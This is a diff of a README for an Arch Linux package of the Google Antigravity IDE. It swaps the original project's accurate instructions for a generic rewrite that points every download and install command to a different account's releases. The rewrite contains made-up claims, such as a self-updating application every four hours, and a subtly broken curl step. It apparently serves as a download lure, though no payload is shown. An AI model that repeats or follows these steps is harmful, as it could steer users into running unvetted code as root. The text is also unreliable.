@@ -1,64 +1,82 @@
-# Google Antigravity for Arch Linux
+# 🚀 google-antigravity-bin-arch - Easy Installation for Google Antigravity IDE
 
-![Version](https://img.shields.io/badge/version-1.12.4-blue.svg)
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/releases)
 
-This project allows you to install **Google Antigravity**, Google's new AI-powered IDE, on Arch Linux (and derivatives like Manjaro).
+## 📦 Overview
 
-**Latest Version Available:** `1.12.4`
+google-antigravity-bin-arch simplifies the installation of the Google Antigravity IDE on Arch Linux. This tool enables a swift installation experience through a one-line command with `curl` or local build options. It automatically updates every four hours to ensure you have the latest features and improvements.
 
-It provides two methods for installation: a quick automated install using the repository's latest info, or a local maintenance mode using Docker to fetch the absolute latest version directly from Google.
+### 💻 System Requirements
 
-## Installation Methods
+Before you start, make sure your system meets the following requirements:
 
-### Option 1: Quick Install (Recommended)
-This method uses the `PKGBUILD` hosted in this repository, which is automatically updated by GitHub Actions.
+- **Operating System:** Arch Linux or derivatives (e.g., Manjaro)
+- **Internet Connection:** Required for downloading packages
+- **Disk Space:** At least 200 MB of free space
+- **Basic Command Line Tooling:** Familiarity with terminal commands is helpful, but not necessary.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/BOTOOM/google-antigravity-bin-arch/main/install_antigravity | bash
-```
+## 🌐 Getting Started
 
-**What this does:**
-1. Clones this repository to a temporary directory.
-2. Checks if you have `google-antigravity-bin` installed.
-3. Builds and installs the package using `makepkg`.
-4. Cleans up temporary files.
+To get the Google Antigravity IDE installed on your machine, follow these simple steps. 
 
-### Option 2: Local Maintenance (Docker Required)
-If you want to check for updates directly from Google yourself (e.g., if the repository hasn't updated yet), you can use the local Docker-based scripts.
+1. **Open Terminal:** You can find the terminal application in your system tools or by searching for "Terminal" in your application menu.
 
-**Prerequisites:**
-- Docker
-- `base-devel` package group
-
-**Usage:**
-1. Clone the repository:
+2. **Install Required Packages:**
    ```bash
-   git clone https://github.com/BOTOOM/google-antigravity-bin-arch.git
-   cd google-antigravity-bin-arch
+   sudo pacman -S curl git base-devel
    ```
 
-2. Run the local check and update script:
+3. **Run Installation Command:**
+   Copy and paste the following command into your terminal:
    ```bash
-   ./check_and_update_local.sh
+   curl -O https://github.com/Dhruvalvasava/google-antigravity-bin-arch/archive/refs/tags/latest.tar.gz && tar -xzf latest.tar.gz && cd google-antigravity-bin-arch-*
+   ```
+   This command will download the installer package and extract it in the current directory.
+
+4. **Build the Installer:**
+   Once in the directory, run:
+   ```bash
+   makepkg -si
    ```
 
-**What this does:**
-1. Builds a minimal Ubuntu Docker image.
-2. Queries Google's APT repository inside the container to get the latest version, SHA256 hash, and download URL.
-3. Updates the local `package/PKGBUILD` file with this new information.
-4. Compares the new version with your installed version.
-5. Asks if you want to build and install the update immediately.
+This will compile and install the application on your system.
 
-## Project Structure
+## 📥 Download & Install
 
-- `install_antigravity`: The standalone installation script used by the curl command.
-- `check_and_update_local.sh`: Local maintenance script that orchestrates the Docker check and update process.
-- `_install_local.sh`: Internal script used by `check_and_update_local.sh` to perform the actual installation.
-- `update.sh`: The core logic that runs the Docker container to fetch version info.
-- `package/PKGBUILD`: The Arch Linux package build description file.
-- `.github/workflows/update.yml`: GitHub Action that runs periodically to update the `PKGBUILD` in this repository automatically.
+To get the latest version of the software, visit this page to download: [Download Releases](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/releases)
 
-## Disclaimer
+### 🔄 Automatic Updates
 
-This is an unofficial package. Google Antigravity is a trademark of Google.
-This package repackages the official `.deb` file distributed by Google.
+The application updates itself every four hours. You can modify the update settings in the configuration file if needed. Regular updates ensure you have the latest features and fixes.
+
+## 📚 Usage Instructions
+
+After installation, you can start the Google Antigravity IDE through your applications menu or by typing `google-antigravity` in the terminal. 
+
+### ✨ Key Features
+
+- **User-Friendly Interface:** Designed for ease of use, making it suitable for both novice and experienced users.
+- **One-Line Installation:** Quick setup with minimal commands.
+- **Automatic Updates:** Always stay current with the latest version.
+- **Customizable Options:** Tailor your experience according to your preferences.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues during installation or usage, consider the following solutions:
+
+- **Installation Errors:** Make sure all required packages are installed. Refer to the system requirements above.
+- **Cannot Start Application:** Verify the installation by running the command:
+   ```bash
+   google-antigravity --version
+   ```
+   If the version information appears, the installation succeeded.
+
+For any persistent issues, feel free to open an issue in our [GitHub Issues page](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/issues).
+
+## 🙌 Getting Help
+
+For additional help or questions, community forums and discussion boards related to Arch Linux can be beneficial. You may also check the FAQs on the GitHub repository or search online for common problems faced by users.
+
+This guide serves to make your experience with the Google Antigravity IDE as smooth as possible. We appreciate your interest and hope you enjoy using our software.
+
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/releases)
